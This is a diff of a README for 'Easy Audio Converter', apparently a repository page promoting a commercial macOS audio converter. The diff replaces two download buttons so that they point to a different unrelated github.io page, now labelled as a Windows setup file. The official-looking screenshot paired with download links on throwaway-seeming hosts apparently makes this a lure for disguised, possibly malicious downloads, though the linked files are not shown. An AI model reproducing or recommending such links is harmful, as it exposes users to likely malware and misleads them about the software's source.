@@ -2,11 +2,7 @@
 
 ![Easy Audio Converter](https://amvidia.com/images/screenshots/to-audio-converter/to-audio-converter-for-mac.png?amimgver=iv250717)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Easy">
-    <img src="https://img.shields.io/badge/⬇️_Download_Easy_Audio_Converter-1abc9c?style=for-the-badge&logo=apple&logoColor=white" alt="Download Easy Audio Converter for macOS">
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://alvinaarashironmegr.github.io/.github/Easy-Audio-Converter)
 
 ---
 
@@ -88,11 +84,7 @@ Yes — batch mode with multithreading.
 **Is there integration with Music or iTunes library?**  
 Yes — you can choose to add converted files into your music library.
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Easy">
-    <img src="https://img.shields.io/badge/⬇️_Download_Easy_Audio_Converter-1abc9c?style=for-the-badge&logo=apple&logoColor=white" alt="Download Easy Audio Converter for macOS">
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://alvinaarashironmegr.github.io/.github/Easy-Audio-Converter)
 
 ---
 
